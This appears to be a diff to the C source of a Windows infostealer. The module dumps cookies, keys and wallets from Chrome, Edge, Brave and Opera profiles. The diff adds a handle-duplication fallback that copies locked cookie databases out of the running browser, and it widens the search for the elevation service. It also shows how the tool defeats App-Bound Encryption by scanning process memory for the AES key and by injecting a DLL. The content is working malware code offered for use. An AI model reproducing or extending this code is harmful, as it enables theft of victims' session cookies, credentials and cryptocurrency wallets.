@@ -139,34 +139,55 @@ static const struct {
  * Fix: write the current elevation_service.exe path into a volatile HKCU key
  * that shadows the stale HKLM entry, then clean up after the call.
  */
-static void _find_elevation_svc(char *out, size_t outsz)
+static void _scan_svc_dir(const char *appdir, const char *svc_name,
+                           char *best_ver, size_t bvsz,
+                           char *best_path, size_t bpsz)
 {
-    char appdir[MAX_PATH];
-    ExpandEnvironmentStringsA("%ProgramFiles%\\Google\\Chrome\\Application",
-                               appdir, sizeof(appdir));
     char pat[MAX_PATH];
     snprintf(pat, sizeof(pat), "%s\\*", appdir);
-
     WIN32_FIND_DATAA fd;
     memset(&fd, 0, sizeof(fd));
     HANDLE hf = FindFirstFileA(pat, &fd);
     if (hf == INVALID_HANDLE_VALUE) return;
-
-    char best_ver[64] = {0};
-    char best_path[MAX_PATH] = {0};
     do {
         if (!(fd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)) continue;
         if (!isdigit((unsigned char)fd.cFileName[0])) continue;
         char svc[MAX_PATH];
-        snprintf(svc, sizeof(svc), "%s\\%s\\elevation_service.exe",
-                 appdir, fd.cFileName);
+        snprintf(svc, sizeof(svc), "%s\\%s\\%s", appdir, fd.cFileName, svc_name);
         if (GetFileAttributesA(svc) == INVALID_FILE_ATTRIBUTES) continue;
         if (strcmp(fd.cFileName, best_ver) > 0) {
-            strncpy(best_ver, fd.cFileName, sizeof(best_ver) - 1);
-            strncpy(best_path, svc, sizeof(best_path) - 1);
+            strncpy(best_ver, fd.cFileName, bvsz - 1);
+            strncpy(best_path, svc, bpsz - 1);
         }
     } while (FindNextFileA(hf, &fd));
     FindClose(hf);
+}
+
+static void _find_elevation_svc(char *out, size_t outsz)
+{
+    char best_ver[64] = {0};
+    char best_path[MAX_PATH] = {0};
+
+    /* Chrome */
+    char chrome_app[MAX_PATH];
+    ExpandEnvironmentStringsA("%ProgramFiles%\\Google\\Chrome\\Application",
+                               chrome_app, sizeof(chrome_app));
+    _scan_svc_dir(chrome_app, "elevation_service.exe",
+                  best_ver, sizeof(best_ver), best_path, sizeof(best_path));
+
+    /* Edge (x86 install path) */
+    char edge_app[MAX_PATH];
+    ExpandEnvironmentStringsA("%ProgramFiles(x86)%\\Microsoft\\Edge\\Application",
+                               edge_app, sizeof(edge_app));
+    _scan_svc_dir(edge_app, "elevation_service.exe",
+                  best_ver, sizeof(best_ver), best_path, sizeof(best_path));
+
+    /* Edge (x64 install path) */
+    char edge_app64[MAX_PATH];
+    ExpandEnvironmentStringsA("%ProgramFiles%\\Microsoft\\Edge\\Application",
+                               edge_app64, sizeof(edge_app64));
+    _scan_svc_dir(edge_app64, "elevation_service.exe",
+                  best_ver, sizeof(best_ver), best_path, sizeof(best_path));
 
     if (best_path[0]) strncpy(out, best_path, outsz - 1);
 }
@@ -436,6 +457,141 @@ static int _copy_to_temp(const char *src, char *tmp_path, size_t tmp_sz)
     snprintf(tmp_path, tmp_sz, "%s~br%08lx.tmp", tmp,
              (unsigned long)GetTickCount());
     return CopyFileA(src, tmp_path, FALSE) ? 0 : -1;
+}
+
+/* forward — defined later (before injection block) */
+static DWORD _find_browser_pid(const char *proc_name);
+
+/*
+ * Handle-hijack fallback for locked files (e.g. Opera Cookies locked
+ * exclusively without FILE_SHARE_READ).
+ * Enumerates open handles in the target process, finds the one pointing to
+ * `path`, duplicates it with DUPLICATE_SAME_ACCESS, copies to a temp file.
+ * Requires PROCESS_DUP_HANDLE on the target (same-user → always granted).
+ *
+ * Returns 0 on success; -1 on failure.
+ */
+
+/* NtQuerySystemInformation(SystemHandleInformation) layout */
+#pragma pack(push, 4)
+typedef struct {
+    ULONG       ProcessId;
+    UCHAR       ObjType;
+    UCHAR       Flags;
+    USHORT      Handle;
+    PVOID       Object;
+    ACCESS_MASK Access;
+} _SysHnd;
+typedef struct { ULONG n; _SysHnd h[1]; } _SysHndInfo;
+#pragma pack(pop)
+
+typedef NTSTATUS (NTAPI *_pfnNtQSI)(ULONG, PVOID, ULONG, PULONG);
+
+static int _copy_via_dup(const char *src, char *tmp_path, size_t tmp_sz,
+                          const char *proc_name)
+{
+    /* Collect ALL PIDs for proc_name (browser spawns many processes) */
+    #define _MAX_PIDS 128
+    DWORD pids[_MAX_PIDS];
+    int   npi = 0;
+    HANDLE snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
+    if (snap != INVALID_HANDLE_VALUE) {
+        PROCESSENTRY32 pe; pe.dwSize = sizeof(pe);
+        if (Process32First(snap, &pe)) do {
+            if (_stricmp(pe.szExeFile, proc_name) == 0 && npi < _MAX_PIDS)
+                pids[npi++] = pe.th32ProcessID;
+        } while (Process32Next(snap, &pe));
+        CloseHandle(snap);
+    }
+    if (!npi) return -1;
+
+    HMODULE ntdll = GetModuleHandleA("ntdll.dll");
+    _pfnNtQSI pNtQSI = ntdll ?
+        (_pfnNtQSI)GetProcAddress(ntdll, "NtQuerySystemInformation") : NULL;
+    if (!pNtQSI) return -1;
+
+    /* Single NtQSI call for all system handles */
+    ULONG bufsz = 1u << 21; /* 2MB — start bigger since Opera is heavy */
+    _SysHndInfo *info = NULL;
+    for (;;) {
+        free(info);
+        info = (_SysHndInfo *)malloc(bufsz);
+        if (!info) return -1;
+        ULONG need = 0;
+        NTSTATUS st = pNtQSI(16 /*SystemHandleInformation*/, info, bufsz, &need);
+        if (st == 0) break;
+        free(info); info = NULL;
+        if ((ULONG)st != 0xC0000004UL) return -1;
+        bufsz = need ? need + 4096 : bufsz * 2;
+        if (bufsz > (1u << 26)) return -1;
+    }
+
+    /* Open process handles lazily (one per PID, only when we see its handles) */
+    HANDLE hprocs[_MAX_PIDS];
+    for (int j = 0; j < npi; j++) hprocs[j] = NULL;
+
+    HANDLE hfile = INVALID_HANDLE_VALUE;
+    for (ULONG i = 0; i < info->n && hfile == INVALID_HANDLE_VALUE; i++) {
+        DWORD hpid = (DWORD)info->h[i].ProcessId;
+
+        /* Check if this PID belongs to our target browser */
+        int pidx = -1;
+        for (int j = 0; j < npi; j++) {
+            if (pids[j] == hpid) { pidx = j; break; }
+        }
+        if (pidx < 0) continue;
+
+        /* Open process for handle duplication if not yet opened */
+        if (!hprocs[pidx])
+            hprocs[pidx] = OpenProcess(PROCESS_DUP_HANDLE, FALSE, hpid);
+        if (!hprocs[pidx]) continue;
+
+        HANDLE dup = NULL;
+        if (!DuplicateHandle(hprocs[pidx], (HANDLE)(ULONG_PTR)info->h[i].Handle,
+                             GetCurrentProcess(), &dup,
+                             0, FALSE, DUPLICATE_SAME_ACCESS)) continue;
+
+        if (GetFileType(dup) != FILE_TYPE_DISK) { CloseHandle(dup); continue; }
+
+        char fp[MAX_PATH];
+        DWORD flen = GetFinalPathNameByHandleA(dup, fp, sizeof(fp) - 1,
+                                               FILE_NAME_NORMALIZED);
+        if (flen > 0 && flen < sizeof(fp)) {
+            fp[flen] = 0;
+            const char *p = fp;
+            if (strncmp(p, "\\\\?\\", 4) == 0) p += 4;
+            if (_stricmp(p, src) == 0) {
+                SetFilePointer(dup, 0, NULL, FILE_BEGIN);
+                hfile = dup;
+            }
+        }
+        if (hfile == INVALID_HANDLE_VALUE) CloseHandle(dup);
+    }
+    free(info);
+    for (int j = 0; j < npi; j++)
+        if (hprocs[j]) CloseHandle(hprocs[j]);
+
+    if (hfile == INVALID_HANDLE_VALUE) return -1;
+
+    /* Write to temp file */
+    char tmp[MAX_PATH];
+    GetTempPathA(sizeof(tmp), tmp);
+    snprintf(tmp_path, tmp_sz, "%s~br%08lx.tmp", tmp,
+             (unsigned long)GetTickCount());
+    HANDLE hdst = CreateFileA(tmp_path, GENERIC_WRITE, 0, NULL,
+                              CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
+    if (hdst == INVALID_HANDLE_VALUE) { CloseHandle(hfile); return -1; }
+
+    uint8_t rbuf[65536];
+    DWORD rd, wr;
+    int ok = 1;
+    while (ReadFile(hfile, rbuf, sizeof(rbuf), &rd, NULL) && rd > 0) {
+        if (!WriteFile(hdst, rbuf, rd, &wr, NULL) || wr != rd) { ok = 0; break; }
+    }
+    CloseHandle(hdst);
+    CloseHandle(hfile);
+    if (!ok) { DeleteFileA(tmp_path); return -1; }
+    return 0;
 }
 
 /* ── Chrome master key ───────────────────────────────────────────────── */
@@ -797,7 +953,7 @@ static int _extract_v20_hint(const char *db_path, _v20_hint_t *hint)
 }
 
 /*
- * Scan READWRITE pages of all chrome.exe processes for a 32-byte AES-256 key.
+ * Scan READWRITE pages of all matching browser processes for a 32-byte AES-256 key.
  * Use a known (nonce, ct, tag) triplet from a v20 blob as oracle:
  * try each 16-byte-aligned candidate key, accept on GCM tag match.
  */
@@ -868,39 +1024,12 @@ scan_done:
     return found;
 }
 
-/* ── Chrome injection fallback (Chrome 130+, BCrypt-protected key) ────── */
-/*
- * When Chrome 130+ protects the AES key with BCryptProtectMemory
- * (SAME_PROCESS), ReadProcessMemory reads the encrypted form and the
- * external memory scan fails.  Solution: inject a helper DLL into the
- * Chrome BROWSER process (which has no ACG and no CIG on Chrome 150) so
- * BCryptUnprotectMemory can run from inside the correct security context.
- *
- * Requires HAVE_CHROME_INJECT (built by `make chrome-helper`).
- */
-#ifdef HAVE_CHROME_INJECT
-
-/* Shared memory layout — must match chrome_key_helper.c exactly */
-#define _CHROME_SHM_MAGIC 0xCEC0FFEE
-#pragma pack(push, 1)
-typedef struct {
-    uint32_t magic;
-    uint8_t  nonce[12];
-    uint8_t  ct[512];
-    uint32_t ct_len;
-    uint8_t  tag[16];
-    volatile int   found;
-    uint8_t        key[32];
-    volatile int32_t dbg_pages;
-    volatile int32_t dbg_unprotect_ok;
-    volatile int32_t dbg_gcm_tried;
-} _chrome_shm_t;
-#pragma pack(pop)
+/* ── browser process finder (used by injection + handle-dup fallback) ─── */
 
 /*
- * Find the Chrome browser process: the chrome.exe with the largest
- * committed READWRITE footprint (browser process >> renderers).
- * Returns 0 if no Chrome is running.
+ * Find the main browser process by name: pick the instance with the largest
+ * committed READWRITE footprint (browser process >> renderers/helpers).
+ * Returns 0 if no matching process is running.
  */
 static DWORD _find_browser_pid(const char *proc_name)
 {
@@ -933,6 +1062,35 @@ static DWORD _find_browser_pid(const char *proc_name)
     CloseHandle(snap);
     return best_pid;
 }
+
+/* ── Chrome injection fallback (Chrome 130+, BCrypt-protected key) ────── */
+/*
+ * When Chrome 130+ protects the AES key with BCryptProtectMemory
+ * (SAME_PROCESS), ReadProcessMemory reads the encrypted form and the
+ * external memory scan fails.  Solution: inject a helper DLL into the
+ * Chrome BROWSER process (which has no ACG and no CIG on Chrome 150) so
+ * BCryptUnprotectMemory can run from inside the correct security context.
+ *
+ * Requires HAVE_CHROME_INJECT (built by `make chrome-helper`).
+ */
+#ifdef HAVE_CHROME_INJECT
+
+/* Shared memory layout — must match chrome_key_helper.c exactly */
+#define _CHROME_SHM_MAGIC 0xCEC0FFEE
+#pragma pack(push, 1)
+typedef struct {
+    uint32_t magic;
+    uint8_t  nonce[12];
+    uint8_t  ct[512];
+    uint32_t ct_len;
+    uint8_t  tag[16];
+    volatile int   found;
+    uint8_t        key[32];
+    volatile int32_t dbg_pages;
+    volatile int32_t dbg_unprotect_ok;
+    volatile int32_t dbg_gcm_tried;
+} _chrome_shm_t;
+#pragma pack(pop)
 
 /*
  * Inject chrome_key_helper.dll into the Chrome browser process.
@@ -1375,10 +1533,14 @@ static void _dump_cookies_profile(const char *bname, const char *pname,
                                    const uint8_t *mk, int have_mk,
                                    const uint8_t *v20mk, int have_v20mk,
                                    const char *db_path,
+                                   const char *proc_name,
                                    char *out, size_t outsz, size_t *pos)
 {
     char tmp[MAX_PATH] = {0};
-    if (_copy_to_temp(db_path, tmp, sizeof(tmp)) != 0)
+    int rc = _copy_to_temp(db_path, tmp, sizeof(tmp));
+    if (rc != 0 && proc_name)
+        rc = _copy_via_dup(db_path, tmp, sizeof(tmp), proc_name);
+    if (rc != 0)
         return;
 
     size_t db_sz = 0;
@@ -1443,12 +1605,12 @@ static void _dump_browser(const char *name,
     int have_v20mk = (_get_v20_master_key(ud, v20mk) == 0);
 
     /*
-     * v20 fallback path (Chrome 127+ App-Bound Encryption):
-     *  1. External memory scan — works on Chrome 127-129 (key in plaintext).
-     *  2. DLL injection into Chrome browser process — works on Chrome 130+
-     *     (BCryptProtectMemory'd key, requires running as same user as Chrome
+     * v20 fallback path (Chromium 127+ App-Bound Encryption):
+     *  1. External memory scan — works on Chromium 127-129 (key in plaintext).
+     *  2. DLL injection into browser process — works on Chromium 130+
+     *     (BCryptProtectMemory'd key, requires running as same user as browser
      *     and HAVE_CHROME_INJECT built; no ACG/CIG on browser proc).
-     * Both require a running chrome.exe to hold the decrypted key.
+     * Both require a running browser process to hold the decrypted key.
      */
     if (!have_v20mk) {
         char hint_db[MAX_PATH] = {0};
@@ -1487,7 +1649,7 @@ static void _dump_browser(const char *name,
         char cdb[MAX_PATH];
         if (_find_cookies_db(ud, "Default", cdb, sizeof(cdb)) == 0)
             _dump_cookies_profile(name, "Default", mk, have_mk, v20mk, have_v20mk,
-                                  cdb, out, outsz, pos);
+                                  cdb, proc_name, out, outsz, pos);
         _dump_wallets(name, "Default", ud, 0, out, outsz, pos);
         SecureZeroMemory(mk, sizeof(mk));
         SecureZeroMemory(v20mk, sizeof(v20mk));
@@ -1504,7 +1666,7 @@ static void _dump_browser(const char *name,
         char cdb[MAX_PATH];
         if (_find_cookies_db(ud, "Default", cdb, sizeof(cdb)) == 0)
             _dump_cookies_profile(name, "Default", mk, have_mk, v20mk, have_v20mk,
-                                  cdb, out, outsz, pos);
+                                  cdb, proc_name, out, outsz, pos);
         _dump_wallets(name, "Default", ud, 1, out, outsz, pos);
     }
 
@@ -1529,7 +1691,7 @@ static void _dump_browser(const char *name,
             char cdb[MAX_PATH];
             if (_find_cookies_db(ud, fd.cFileName, cdb, sizeof(cdb)) == 0)
                 _dump_cookies_profile(name, fd.cFileName, mk, have_mk, v20mk, have_v20mk,
-                                      cdb, out, outsz, pos);
+                                      cdb, proc_name, out, outsz, pos);
             _dump_wallets(name, fd.cFileName, ud, 1, out, outsz, pos);
         } while (FindNextFileA(hf, &fd));
         FindClose(hf);
@@ -1556,8 +1718,8 @@ int cmd_browser_dump(const char *args, char *output_buf, size_t output_size)
         {"Edge",     "%LOCALAPPDATA%\\Microsoft\\Edge\\User Data",           1, "msedge.exe"},
         {"Brave",    "%LOCALAPPDATA%\\BraveSoftware\\Brave-Browser\\User Data", 1, "brave.exe"},
         {"Chromium", "%LOCALAPPDATA%\\Chromium\\User Data",                  1, "chromium.exe"},
-        {"Opera",    "%APPDATA%\\Opera Software\\Opera Stable",              0, "opera.exe"},
-        {"OperaGX",  "%APPDATA%\\Opera Software\\Opera GX Stable",          0, "opera.exe"},
+        {"Opera",    "%APPDATA%\\Opera Software\\Opera Stable",              1, "opera.exe"},
+        {"OperaGX",  "%APPDATA%\\Opera Software\\Opera GX Stable",          1, "opera.exe"},
     };
 
     size_t pos = 0;
